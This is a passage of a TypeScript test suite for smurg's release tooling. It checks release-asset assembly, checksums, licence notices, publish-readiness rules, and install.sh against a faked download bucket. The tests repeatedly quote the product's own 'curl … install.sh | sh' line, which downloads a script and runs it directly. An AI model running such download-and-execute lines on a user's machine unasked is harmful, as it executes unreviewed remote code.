    const cases: [Target, string, string][] = [
      [DARWIN_ARM64, '/bin/zsh', '~/.zshrc'],
      [DARWIN_ARM64, '/bin/bash', '~/.bash_profile'],
      [LINUX_X64, '/bin/bash', '~/.bashrc'],
      [LINUX_X64, '/usr/bin/fish', '~/.profile'],
    ];
    for (const [target, shell, file] of cases) {
      const f = await faked(target, { SHELL: shell });
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
      expect(result.code).toBe(0);
      expect(result.out).toContain(`請把這一行加到 ${file}`);
      expect(result.out).toContain(`export PATH="${join(f.prefix, 'bin')}:$PATH"`);
    }
    const f = await faked(LINUX_X64);
    const onPath = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], { ...f.env, PATH: `${join(f.prefix, 'bin')}:${f.env['PATH'] as string}` });
    expect(onPath.code).toBe(0);
    expect(onPath.out).not.toContain('不在 PATH 裡');
  });
});

describe('scripts/release-assets.sh → the R2 layout → install.sh (https://downloads.smurg.ai)', () => {
  /** The version's own prefix on the downloads domain: the default download location release-assets.sh bakes in. */
  const BASE = 'https://downloads.smurg.ai/v9.8.7';
  const INSTALL_LINE = 'curl -fsSL https://smurg.ai/install.sh | sh';
  /** The Node.js release the stand-in executables are copies of, and whose LICENSE their notices carry. */
  const FAKE_NODE = '22.23.3';
  /** Notices as scripts/build-sea.sh writes them: the packages, then the Node.js section with its LICENSE. */
  const noticesOf = (node: string): string =>
    `smurg: third-party notices\n\nnode-pty@1.2.0  MIT\n@parcel/watcher@2.6.0  MIT\n@anthropic-ai/sandbox-runtime@0.0.77  Apache-2.0\n\n${'='.repeat(80)}\nnode@${node} (the Node.js runtime)\nLicense: MIT\n\n----- LICENSE -----\nNode.js is licensed for use as follows:\n\nCopyright Node.js contributors. All rights reserved.\n`;
  const NOTICES_TEXT = noticesOf(FAKE_NODE);
  const CHANGELOG = '# 變更紀錄\n\n## [9.9.0] - later\n\n- not this one\n\n## [9.8.7] - 2026-10-01\n\n第一版（[主人指南](docs/HOSTING.md#1-安裝)、[外部](https://example.com/x)、[錨點](#已知限制)）。\n\n### 已知限制\n\n- 很多。\n\n## [9.8.6] - 2026-09-30\n\n- older\n';

  /**
   * A stand-in executable of `version` on Node.js `node`: it carries what release-assets.sh reads from every executable
   * (the build marker scripts/build-sea.sh writes, the download URL of its Node.js release: scripts/release-markers.ts),
   * and this machine's one is run: it says its version and Node.js as `smurg --version` does.
   */
  const fakeOf = (name: string, version: string, node = FAKE_NODE): string =>
    `#!/bin/sh\n# smurg-build-version=${version};\n# https://nodejs.org/download/release/v${node}/\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\necho "smurg ${version} (fake ${name}, node ${node})"\n`;

  async function releaseDirs(
    dirs: Dirs,
    options: { readonly names?: readonly string[]; readonly sub?: string; readonly version?: string; readonly notices?: string | null } = {},
  ): Promise<{ dist: string; out: string; notes: string; changelog: string }> {
    const version = options.version ?? '9.8.7';
    const base = join(dirs.home, options.sub ?? 'r');
    const dist = join(base, 'dist');
    const names = options.names ?? TARGETS.map((t) => t.name);
    for (const name of names) await writeExecutable(join(dist, name), fakeOf(name, version));
    // Downloaded CI artifacts lose their mode bits: the host's copy is not executable here.
    if (names.includes(HOST_NAME)) await chmod(join(dist, HOST_NAME), 0o644);
    // scripts/build-sea.sh writes the notices next to the executable; the release workflow puts them into the dist.
    if (options.notices !== null) await writeFile(join(dist, 'THIRD-PARTY-NOTICES.txt'), options.notices ?? NOTICES_TEXT);
    const changelog = join(base, 'CHANGELOG.md');
    await writeFile(changelog, CHANGELOG);
    return { dist, out: join(base, 'out'), notes: join(base, 'notes', 'notes.md'), changelog };
  }

  const assets = (args: readonly string[]): Promise<Run> => runShell('/bin/bash', [RELEASE_ASSETS, ...args], { PATH: SYSTEM_PATH, HOME: '/nonexistent' });

  /** A stand-in curl that serves https://downloads.smurg.ai/<key> from <bucket>/<key> (and nothing else), logging each call. */
  async function r2Curl(f: Faked, bucket: string): Promise<void> {
    await writeExecutable(
      join(f.dirs.home, 'fakebin', 'curl'),
      `#!/bin/sh\nout=''; prev=''; url=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; url="$a"; done\necho "curl $*" >>"$FAKE_LOG"\ncase "$url" in\n  https://downloads.smurg.ai/*) src='${bucket}'/"\${url#https://downloads.smurg.ai/}"; [ -f "$src" ] || exit 22; cp "$src" "$out" ;;\n  *) exit 6 ;;\nesac\n`,
    );
  }

  /** The bucket as scripts/publish-downloads.sh leaves it: v<version>/ for each, latest/ = the last one. */
  async function bucketOf(dirs: Dirs, releases: readonly [string, string][]): Promise<string> {
    const bucket = join(dirs.home, 'bucket');
    for (const [version, out] of releases) {
      await mkdir(join(bucket, `v${version}`), { recursive: true });
      for (const name of [...TARGETS.map((t) => t.name), 'SHA256SUMS', 'install.sh', 'THIRD-PARTY-NOTICES.txt']) {
        await writeFile(join(bucket, `v${version}`, name), await readFile(join(out, name)));
      }
    }
    const [latest] = releases.at(-1) as [string, string];
    await mkdir(join(bucket, 'latest'), { recursive: true });
    await writeFile(join(bucket, 'latest', 'install.sh'), await readFile(join(bucket, `v${latest}`, 'install.sh')));
    await writeFile(join(bucket, 'latest', 'VERSION'), `${latest}\n`);
    return bucket;
  }

  it('writes the four executables, SHA256SUMS, install.sh with this version’s download location, the notices, and the notes', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const built = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--require-all', '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.out).toContain(`publish (a person, docs/RELEASING.md §4):  scripts/publish-downloads.sh --version 9.8.7 --dist ${r.out}`);
    expect(built.out).toContain(`the install line (the latest published version):  ${INSTALL_LINE}`);
    expect(built.code).toBe(0);
    const sums = await readFile(join(r.out, 'SHA256SUMS'), 'utf8');
    expect(sums).toBe(
      [...TARGETS]
        .sort((a, b) => a.name.localeCompare(b.name))
        .map((t) => `${sha(fakeOf(t.name, '9.8.7'))}  ${t.name}\n`)
        .join(''),
    );
    expect(built.out).toContain(`release-assets: ${HOST_NAME} --version: smurg 9.8.7 (fake ${HOST_NAME}, node ${FAKE_NODE})`);
    for (const target of TARGETS) expect((await stat(join(r.out, target.name))).mode & 0o777).toBe(0o755);
    const script = await readFile(join(r.out, 'install.sh'), 'utf8');
    expect(script.split('\n').filter((line) => line.startsWith('SMURG_RELEASE_BASE_URL='))).toEqual([`SMURG_RELEASE_BASE_URL='${BASE}'`]);
    expect(script.replace(`SMURG_RELEASE_BASE_URL='${BASE}'`, "SMURG_RELEASE_BASE_URL=''")).toBe(await readFile(INSTALL, 'utf8'));
    expect((await stat(join(r.out, 'install.sh'))).mode & 0o777).toBe(0o755);
    expect(await readFile(join(r.out, 'THIRD-PARTY-NOTICES.txt'), 'utf8')).toBe(NOTICES_TEXT);
    expect((await stat(join(r.out, 'THIRD-PARTY-NOTICES.txt'))).mode & 0o777).toBe(0o644);
    expect((await readdir(r.out)).sort()).toEqual(['SHA256SUMS', 'THIRD-PARTY-NOTICES.txt', 'install.sh', ...TARGETS.map((t) => t.name)].sort());

    // The notes (the private GitHub release, the internal record): the section as written, then the one install line
    // and the checksums. No GitHub URL (the repository is private), no other install command.
    const notes = await readFile(r.notes, 'utf8');
    expect(notes.startsWith('第一版（[主人指南](docs/HOSTING.md#1-安裝)、[外部](https://example.com/x)、[錨點](#已知限制)）。\n\n### 已知限制\n\n- 很多。\n\n## 安裝\n')).toBe(true);
    expect(notes).not.toContain('not this one');
    expect(notes).not.toContain('older');
    expect(notes.split('\n').filter((line) => line.includes('curl'))).toEqual([INSTALL_LINE]);
    expect(notes.toLowerCase()).not.toContain('github');
    expect(notes).toContain(sums);
  });

  it('`curl -fsSL https://smurg.ai/install.sh | sh` on the R2 layout: latest/install.sh installs its own version from its own prefix', async () => {
    const dirs = await setup();
    const older = await releaseDirs(dirs, { sub: 'old', version: '9.8.6' });
    const current = await releaseDirs(dirs, { sub: 'new' });
    expect((await assets(['--version', '9.8.6', '--dist', older.dist, '--out', older.out, '--require-all'])).code).toBe(0);
    expect((await assets(['--version', '9.8.7', '--dist', current.dist, '--out', current.out, '--require-all'])).code).toBe(0);
    const bucket = await bucketOf(dirs, [
      ['9.8.6', older.out],
      ['9.8.7', current.out],
    ]);
    const f = await faked(LINUX_X64);
    await r2Curl(f, bucket);
    // https://smurg.ai/install.sh is a 302 to latest/install.sh: what `sh` reads is that file.
    const latest = await readFile(join(bucket, 'latest', 'install.sh'), 'utf8');
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s', '--', '--no-deps'], f.env, latest);
      expect(result.out).toContain(`smurg 9.8.7 (fake smurg-linux-x64, node ${FAKE_NODE})`);
      expect(result.code).toBe(0);
      expect(result.out).toContain('smurg 的授權條款：https://smurg.ai/license/');
      expect(result.out).toContain(`第三方元件的授權條款：${BASE}/THIRD-PARTY-NOTICES.txt`);
      // The next steps: the built-in relay, or another relay the maintainers run (nobody else can run one).
      expect(result.out).toContain('（維護者提供的其他 relay：加上 --relay <網址>）');
      expect(result.out).not.toMatch(/自己架設|self-host/i);
    }
    expect(await readFile(join(f.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeOf('smurg-linux-x64', '9.8.7'));
    const fetched = (await f.calls()).filter((call) => call.startsWith('curl '));
    expect(fetched.length).toBe(2 * SHELLS.length);
    for (const call of fetched) {
      expect(call).toContain('--proto =https --proto-redir =https');
      expect(call).toMatch(/ https:\/\/downloads\.smurg\.ai\/v9\.8\.7\/(SHA256SUMS|smurg-linux-x64)$/);
    }

    // A version's own installer keeps installing that version (curl -fsSL https://downloads.smurg.ai/v9.8.6/install.sh | sh).
    const pinned = await faked(LINUX_X64);
    await r2Curl(pinned, bucket);
    const old = await runShell('/bin/sh', ['-s', '--', '--no-deps'], pinned.env, await readFile(join(bucket, 'v9.8.6', 'install.sh'), 'utf8'));
    expect(old.code).toBe(0);
    expect(await readFile(join(pinned.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeOf('smurg-linux-x64', '9.8.6'));
    expect((await pinned.calls()).filter((call) => call.startsWith('curl ')).every((call) => call.includes(' https://downloads.smurg.ai/v9.8.6/'))).toBe(true);
  });

  it('--base-url bakes another download location (a test elsewhere); the notes still give only the install line', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const other = 'https://staging.example.test/smurg/v9.8.7/';
    const built = await assets(['--version', '9.8.7', '--base-url', other, '--dist', r.dist, '--out', r.out, '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.code).toBe(0);
    expect(built.out).toContain("this version's installer:  curl -fsSL https://staging.example.test/smurg/v9.8.7/install.sh | sh");
    expect((await readFile(join(r.out, 'install.sh'), 'utf8')).split('\n').filter((line) => line.startsWith('SMURG_RELEASE_BASE_URL='))).toEqual([
      "SMURG_RELEASE_BASE_URL='https://staging.example.test/smurg/v9.8.7'",
    ]);
    expect((await readFile(r.notes, 'utf8')).split('\n').filter((line) => line.includes('curl'))).toEqual([INSTALL_LINE]);
  });

  it('refuses a release that misses a platform (--require-all), a changelog without the version, a wrong version', async () => {
    const dirs = await setup();
    const partial = await releaseDirs(dirs, { names: ['smurg-darwin-arm64', 'smurg-linux-x64', HOST_NAME], sub: 'partial' });
    const missing = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out, '--require-all']);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toMatch(/missing in .*: .*smurg-/);
    expect(existsSync(partial.out)).toBe(false);

    // Without this machine's executable nothing is run, so the changelog is what refuses 9.8.8.
    const others = await releaseDirs(dirs, { names: TARGETS.map((t) => t.name).filter((name) => name !== HOST_NAME), sub: 'others' });
    const noSection = await assets(['--version', '9.8.8', '--dist', others.dist, '--out', others.out, '--notes', others.notes, '--changelog', others.changelog]);
    expect(noSection.code).not.toBe(0);
    expect(noSection.out).toContain('has no section for 9.8.8');
    expect(existsSync(others.notes)).toBe(false);

    // Every executable must be the release's build (its build marker), and this machine's must also report exactly the
    // release's version when it runs.
    const full = await releaseDirs(dirs, { sub: 'full' });
    const wrong = await assets(['--version', '9.8.8', '--dist', full.dist, '--out', full.out]);
    expect(wrong.code).not.toBe(0);
    for (const target of TARGETS) expect(wrong.out).toContain(`${target.name} was built as smurg 9.8.7, not 9.8.8`);
    expect(existsSync(full.out)).toBe(false);
    const lying = await releaseDirs(dirs, { sub: 'lying', version: '9.8.8' });
    await writeExecutable(join(lying.dist, HOST_NAME), fakeOf(HOST_NAME, '9.8.8').replace('echo "smurg 9.8.8', 'echo "smurg 9.8.7'));
    const ran = await assets(['--version', '9.8.8', '--dist', lying.dist, '--out', lying.out]);
    expect(ran.code).not.toBe(0);
    expect(ran.out).toContain(`${HOST_NAME} reports 'smurg 9.8.7 (fake ${HOST_NAME}, node ${FAKE_NODE})', not smurg 9.8.8`);

    const tag = await assets(['--version', 'v9.8.7', '--dist', full.dist, '--out', full.out]);
    expect(tag.code).toBe(2);
    expect(tag.out).toContain('no leading v');
    const http = await assets(['--version', '9.8.7', '--base-url', 'http://example.invalid/x', '--dist', full.dist, '--out', full.out]);
    expect(http.code).toBe(2);
  });

  it('refuses to assemble without the third-party notices, or with notices that do not name what the executables bundle', async () => {
    const dirs = await setup();
    const none = await releaseDirs(dirs, { sub: 'none', notices: null });
    const missing = await assets(['--version', '9.8.7', '--dist', none.dist, '--out', none.out, '--require-all']);
    expect(missing.code).toBe(1);
    expect(missing.out).toContain(`${none.dist}/THIRD-PARTY-NOTICES.txt is missing`);
    expect(missing.out).toContain('--notices FILE');
    expect(existsSync(none.out)).toBe(false);

    const empty = await releaseDirs(dirs, { sub: 'empty', notices: '' });
    const emptied = await assets(['--version', '9.8.7', '--dist', empty.dist, '--out', empty.out]);
    expect(emptied.code).toBe(1);
    expect(emptied.out).toContain('THIRD-PARTY-NOTICES.txt is empty');
    expect(existsSync(empty.out)).toBe(false);

    const partial = await releaseDirs(dirs, { sub: 'partial', notices: 'node-pty  MIT\nNode.js\n' });
    const short = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out]);
    expect(short.code).toBe(1);
    expect(short.out).toContain('does not mention @parcel/watcher @anthropic-ai/sandbox-runtime');
    expect(existsSync(partial.out)).toBe(false);

    // --notices names another file.
    const elsewhere = join(dirs.home, 'notices.txt');
    await writeFile(elsewhere, `${NOTICES_TEXT}(from elsewhere)\n`);
    const given = await assets(['--version', '9.8.7', '--dist', none.dist, '--out', none.out, '--notices', elsewhere]);
    expect(given.code).toBe(0);
    expect(await readFile(join(none.out, 'THIRD-PARTY-NOTICES.txt'), 'utf8')).toBe(`${NOTICES_TEXT}(from elsewhere)\n`);
  });

  it('refuses notices that are not complete: the committed file (its Node.js section a placeholder), or no Node.js section', async () => {
    const dirs = await setup();
    // The repository's own packages/cli/THIRD-PARTY-NOTICES.txt names every component, Node.js included (the heading of
    // its placeholder section), but it is not what a release publishes.
    const committed = fileURLToPath(new URL('../THIRD-PARTY-NOTICES.txt', import.meta.url));
    const r = await releaseDirs(dirs, { sub: 'committed' });
    const unfilled = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--require-all', '--notices', committed]);
    expect(unfilled.code).toBe(1);
    expect(unfilled.out).toContain('is the committed packages/cli/THIRD-PARTY-NOTICES.txt, whose Node.js section is still the placeholder');
    expect(existsSync(r.out)).toBe(false);

    for (const [sub, notices] of [
      ['heading-only', NOTICES_TEXT.replace(`node@${FAKE_NODE} (the Node.js runtime)`, 'Node.js runtime')],
      ['no-license', NOTICES_TEXT.replace('Node.js is licensed for use as follows:', 'see nodejs.org')],
      ['twice', `${NOTICES_TEXT}node@22.0.0 (the Node.js runtime)\n`],
    ] as const) {
      const partial = await releaseDirs(dirs, { sub, notices });
      const refused = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out]);
      expect(refused.code, sub).toBe(1);
      expect(refused.out, sub).toContain('has no complete Node.js section');
      expect(existsSync(partial.out), sub).toBe(false);
    }
  });

  it('every executable must be this version’s build, on the Node.js whose LICENSE the notices carry (a release assembled by hand)', async () => {
    const dirs = await setup();
    // Three executables left over from 9.8.6 next to this machine's 9.8.7 build (docs/RELEASING.md §4.3 mixes builds
    // from two places): refused, each named, before anything is written.
    const stale = await releaseDirs(dirs, { sub: 'stale' });
    for (const target of TARGETS) if (target.name !== HOST_NAME) await writeExecutable(join(stale.dist, target.name), fakeOf(target.name, '9.8.6'));
    const mixed = await assets(['--version', '9.8.7', '--dist', stale.dist, '--out', stale.out, '--require-all']);
    expect(mixed.code).toBe(1);
    expect(mixed.out).toContain('these are not the executables of smurg 9.8.7');
    for (const target of TARGETS) {
      if (target.name === HOST_NAME) expect(mixed.out).not.toContain(`${target.name} was built`);
      else expect(mixed.out).toContain(`${target.name} was built as smurg 9.8.6, not 9.8.7`);
    }
    expect(existsSync(stale.out)).toBe(false);

    // No build marker at all (not built by scripts/build-sea.sh --version), and no Node.js release URL.
    const bare = await releaseDirs(dirs, { sub: 'bare' });
    await writeExecutable(join(bare.dist, 'smurg-linux-arm64'), fakeBinary('smurg-linux-arm64'));
    const unmarked = await assets(['--version', '9.8.7', '--dist', bare.dist, '--out', bare.out]);
    expect(unmarked.code).toBe(1);
    expect(unmarked.out).toContain('smurg-linux-arm64 was built as smurg (no build marker');
    expect(unmarked.out).toContain('smurg-linux-arm64 is Node.js (none');

    // One executable on another Node.js release (another runner's cache, or the arm64 machine of §4.3).
    const other = await releaseDirs(dirs, { sub: 'other-node' });
    await writeExecutable(join(other.dist, 'smurg-linux-arm64'), fakeOf('smurg-linux-arm64', '9.8.7', '22.23.2'));
    const differs = await assets(['--version', '9.8.7', '--dist', other.dist, '--out', other.out]);
    expect(differs.code).toBe(1);
    expect(differs.out).toContain(`smurg-linux-arm64 is Node.js 22.23.2, but the notices have the LICENSE of Node.js ${FAKE_NODE}`);

    // The notices of another build (another Node.js): every executable disagrees with them.
    const otherNotices = await releaseDirs(dirs, { sub: 'other-notices', notices: noticesOf('22.22.1') });
    const notThese = await assets(['--version', '9.8.7', '--dist', otherNotices.dist, '--out', otherNotices.out]);
    expect(notThese.code).toBe(1);
    for (const target of TARGETS) expect(notThese.out).toContain(`${target.name} is Node.js ${FAKE_NODE}, but the notices have the LICENSE of Node.js 22.22.1`);

    // This machine's executable runs on another Node.js than its markers say: its --version tells.
    const runs = await releaseDirs(dirs, { sub: 'runs' });
    await writeExecutable(join(runs.dist, HOST_NAME), fakeOf(HOST_NAME, '9.8.7').replace(`, node ${FAKE_NODE})"`, ', node 22.0.0)"'));
    const ranOn = await assets(['--version', '9.8.7', '--dist', runs.dist, '--out', runs.out]);
    expect(ranOn.code).toBe(1);
    expect(ranOn.out).toContain(`${HOST_NAME} reports 'smurg 9.8.7 (fake ${HOST_NAME}, node 22.0.0)': not Node.js ${FAKE_NODE}`);
  });

  it('--check-arch refuses a file that is not the executable its name says', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const result = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--check-arch']);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('is not the executable its name says');
  });

  it('--publish-checks (before a tag is built): a dated section, no placeholders, the built-in relay, the install line, no link to the private repository, the license, one version everywhere', async () => {
    const dirs = await setup();
    // The script works from the repository it lives in: a copy of it in a stand-in repository.
    const repo = join(dirs.home, 'repo');
    const script = join(repo, 'scripts', 'release-assets.sh');
    await writeExecutable(script, await readFile(RELEASE_ASSETS, 'utf8'));
    const put = async (path: string, text: string): Promise<void> => {
      await mkdir(dirname(join(repo, path)), { recursive: true });
      await writeFile(join(repo, path), text);
    };
    const pkg = (version: string, license = 'UNLICENSED', isPrivate = true): string =>
      `{\n  "name": "x",\n  "version": "${version}",\n${isPrivate ? '  "private": true,\n' : ''}  "license": "${license}"\n}\n`;
    const relay = (value: string): string => `// the built-in relay\nexport const DEFAULT_RELAY_URL: string | null = ${value};\n`;
    const LICENSE = 'smurg\n\nCopyright (c) 2026 Example Ltd. All rights reserved.\n\n4. Third-party components keep their own licenses (for example the Apache License 2.0).\n';
    const check = (version: string, extra: readonly string[] = []): Promise<Run> =>
      runShell('/bin/bash', [script, '--version', version, '--publish-checks', ...extra], { PATH: SYSTEM_PATH, HOME: '/nonexistent' });

    // Everything still to fill in, as in the repository before the first deploy and before the license was decided.
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - Unreleased\n\n- 公用 relay：<RELAY_URL>\n');
    await put('README.md', '公用 relay <RELAY_URL>\n');
    await put('docs/HOSTING.md', 'https://smurg-relay.<account-subdomain>.workers.dev\n');
    await put('docs/JOINING.md', `nothing to fill in\n${INSTALL_LINE}\n`);
    await put('packages/cli/src/relay/default-relay.ts', relay('null'));
    for (const path of ['package.json', 'packages/cli/package.json']) await put(path, pkg('9.8.7'));
    await put('packages/daemon/package.json', pkg('0.0.0'));
    await put('apps/relay/package.json', pkg('9.8.7', 'Apache-2.0'));
    await put('tests/e2e/package.json', pkg('9.8.7', 'UNLICENSED', false));
    await put('LICENSE', 'smurg\n\nCopyright (c) 2026 <COPYRIGHT HOLDER>. All rights reserved.\n');
    const before = await check('9.8.7');
    expect(before.code).toBe(1);
    expect(before.out).toContain("the heading '## [9.8.7] - Unreleased' has no release date");
    expect(before.out).toContain('CHANGELOG.md: the 9.8.7 section still has a placeholder');
    expect(before.out).toContain('README.md still has a placeholder');
    expect(before.out).toContain('docs/HOSTING.md still has a placeholder');
    expect(before.out).not.toContain('docs/JOINING.md');
    expect(before.out).toContain('DEFAULT_RELAY_URL is not the deployed relay');
    expect(before.out).toContain("packages/daemon/package.json: version '0.0.0', not 9.8.7");
    expect(before.out).not.toContain('packages/cli/package.json');
    expect(before.out).toContain(`README.md does not show the install line  ${INSTALL_LINE}`);
    expect(before.out).toContain(`docs/HOSTING.md does not show the install line  ${INSTALL_LINE}`);
    expect(before.out).toContain('LICENSE still has the placeholder <COPYRIGHT HOLDER>');
    expect(before.out).toContain('apps/relay/package.json: "license" is not "UNLICENSED"');
    expect(before.out).toContain('tests/e2e/package.json: not "private": true');
    // The same, whatever --base-url is given (it only concerns the assembly).
    expect((await check('9.8.7', ['--base-url', 'https://example.test/x'])).out).toBe(before.out);

    // Filled in, but README.md still names another relay than the binary's built-in one, and gives the old GitHub
    // install URL of the shared relay's public-repository days instead of the install line.
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org\n');
    await put('README.md', 'curl -fsSL https://github.com/gclinian/smurg/releases/latest/download/install.sh | sh\n公用 relay https://smurg-relay.example.workers.dev\n');
    await put('docs/HOSTING.md', `${INSTALL_LINE}\n公用 relay https://app.example.org\n`);
    await put('docs/JOINING.md', `${INSTALL_LINE}\n邀請連結 https://app.example.org/join/<id>#…\n`);
    await put('packages/cli/src/relay/default-relay.ts', relay("'https://app.example.org'"));
    await put('packages/daemon/package.json', pkg('9.8.7'));
    await put('apps/relay/package.json', pkg('9.8.7'));
    await put('tests/e2e/package.json', pkg('9.8.7'));
    await put('LICENSE', LICENSE);
    const stale = await check('9.8.7');
    expect(stale.code).toBe(1);
    expect(stale.out).toContain('README.md does not name the built-in relay https://app.example.org');
    expect(stale.out).toContain(`README.md does not show the install line  ${INSTALL_LINE}`);
    // The workers.dev address README.md still gives is not the built-in relay's: a stale address of the shared relay.
    expect(stale.out).toContain('README.md names a workers.dev address that is not the built-in relay: https://smurg-relay.example.workers.dev');
    expect(stale.out).toContain('README.md names the GitHub repository (github.com/gclinian/smurg), which is private');
    for (const fine of ['docs/HOSTING.md', 'docs/JOINING.md', 'CHANGELOG.md', 'LICENSE', 'package.json']) expect(stale.out).not.toContain(fine);

    // Filled in: ready (and a pre-release tag of the same X.Y.Z passes too, below).
    await put('README.md', `${INSTALL_LINE}\n公用 relay https://app.example.org\n`);
    const ready = await check('9.8.7');
    expect(ready.out).toContain('9.8.7 is ready to publish');
    expect(ready.code).toBe(0);

    // A link to the private repository anywhere users read it: the section, the product page, the web app (its
    // strings and static files); in any case and in the ssh form. node_modules and maintainer docs are not looked at.
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org（[原始碼](https://GitHub.com/gclinian/smurg)）\n');
    await put('apps/site/public/index.html', '<a href="https://github.com/gclinian/smurg/blob/main/docs/HOSTING.md">guide</a>\n');
    await put('apps/site/public/zh-TW/index.html', '<a href="/docs/hosting/">指南</a>\n');
    await put('apps/web/src/about.ts', "export const SOURCE = 'git@github.com:gclinian/smurg.git';\n");
    await put('apps/web/public/help.txt', 'https://github.com/gclinian/smurg/issues\n');
    await put('apps/web/node_modules/some-package/README.md', 'https://github.com/gclinian/smurg\n');
    await put('docs/RELEASING.md', 'gh release view --repo gclinian/smurg; https://github.com/gclinian/smurg/actions\n');
    const linked = await check('9.8.7');
    expect(linked.code).toBe(1);
    const repoProblems = linked.out.split('\n').filter((line) => line.includes('names the GitHub repository'));
    expect(repoProblems.map((line) => line.replace(/^ {2}- /, '').split(' names ')[0])).toEqual([
      'CHANGELOG.md: the 9.8.7 section',
      'apps/site/public/index.html',
      'apps/web/src/about.ts',
      'apps/web/public/help.txt',
    ]);
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org\n');
    for (const path of ['apps/site/public/index.html', 'apps/web/src/about.ts', 'apps/web/public/help.txt']) await rm(join(repo, path));
    expect((await check('9.8.7')).code).toBe(0);

    // LICENSE: missing, or still the Apache License text.
    await put('LICENSE', '\n                                 Apache License\n                           Version 2.0, January 2004\n');
    expect((await check('9.8.7')).out).toContain('LICENSE is still the Apache License 2.0');
    await rm(join(repo, 'LICENSE'));
    expect((await check('9.8.7')).out).toContain('LICENSE is missing');
    await put('LICENSE', LICENSE);

    // A self-hosted relay's workers.dev address written with a placeholder is fine; a concrete one other than the
    // built-in relay is not, in the version's section either; and docs/JOINING.md shows the install line too.
    await put('docs/HOSTING.md', `${INSTALL_LINE}\n公用 relay https://app.example.org\n自己架設：https://smurg-relay.<你的子網域>.workers.dev\n`);
    expect((await check('9.8.7')).code).toBe(0);
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org（之前是 https://smurg-relay.old-sub.workers.dev）\n');
    await put('docs/JOINING.md', '邀請連結 https://app.example.org/join/<id>#…\n');
    const old = await check('9.8.7');
    expect(old.code).toBe(1);
    expect(old.out).toContain('CHANGELOG.md: the 9.8.7 section names a workers.dev address that is not the built-in relay: https://smurg-relay.old-sub.workers.dev');
    expect(old.out).toContain(`docs/JOINING.md does not show the install line  ${INSTALL_LINE}`);
    expect(old.out).not.toContain('docs/HOSTING.md');
    expect(old.out).not.toContain('README.md');
    // The built-in relay itself on workers.dev (as before 2026-10-01): naming it is not stale.
    await put('packages/cli/src/relay/default-relay.ts', relay("'https://smurg-relay.mine.workers.dev'"));
    for (const doc of ['README.md', 'docs/HOSTING.md', 'docs/JOINING.md']) await put(doc, `${INSTALL_LINE}\n公用 relay https://smurg-relay.mine.workers.dev\n`);
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://smurg-relay.mine.workers.dev\n');
    expect((await check('9.8.7')).code).toBe(0);

    // The installer every release ships (and never replaces once published): no relay of one's own for outside users,
    // no "open source".
    await put('scripts/install.sh', "#!/bin/sh\nsay '  smurg login   # 公用 relay（自己架設的 relay：加上 --relay <網址>）'\n");
    const selfHosted = await check('9.8.7');
    expect(selfHosted.code).toBe(1);
    expect(selfHosted.out).toContain("scripts/install.sh offers a relay of one's own or calls smurg open source (line 2)");
    await put('scripts/install.sh', "#!/bin/sh\n# smurg is Open Source\nsay '  smurg login   # 公用 relay（維護者提供的其他 relay：加上 --relay <網址>）'\n");
    expect((await check('9.8.7')).out).toContain("scripts/install.sh offers a relay of one's own or calls smurg open source (line 2)");
    await put('scripts/install.sh', "#!/bin/sh\nsay '  smurg login   # 公用 relay（維護者提供的其他 relay：加上 --relay <網址>）'\n");
    expect((await check('9.8.7')).code).toBe(0);

    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7-rc.1] - 2026-10-02\n\n- 試用版\n');
    expect((await check('9.8.7-rc.1')).code).toBe(0);
  });
});

describe('scripts/install.sh says what holds for everyone who runs it (the source is private since 2026-10-01)', () => {
  it('offers no relay of one’s own and never calls smurg open source: a published copy is never replaced', async () => {
    const script = await readFile(INSTALL, 'utf8');
    expect(script).not.toMatch(/自己架設|自架|self-host|open[ -]?source|開源|開放原始碼|apache/i);
    expect(script).toContain('smurg 內建的公用 relay（維護者提供的其他 relay：加上 --relay <網址>）');
  });
});

describe('scripts/install.sh from a local server with the R2 layout (v<X.Y.Z>/ and latest/)', () => {
  /** Serves <root>/<path> (the bucket as downloads.smurg.ai serves it; the query string ignored). */
  async function serveBucket(root: string): Promise<Release> {
    const requests: string[] = [];
    const server: Server = createServer((req, res) => {
      requests.push(req.url ?? '');
      const path = (req.url ?? '/').split('?')[0] as string;
      if (path.includes('..')) {
        res.writeHead(404).end();
        return;
      }
      readFile(join(root, path))
        .then((body) => res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(body))
        .catch(() => res.writeHead(404).end());
    });
    await new Promise<void>((resolve) => server.listen({ host: '127.0.0.1', port: 0 }, resolve));
    cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
    return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}`, requests };
  }

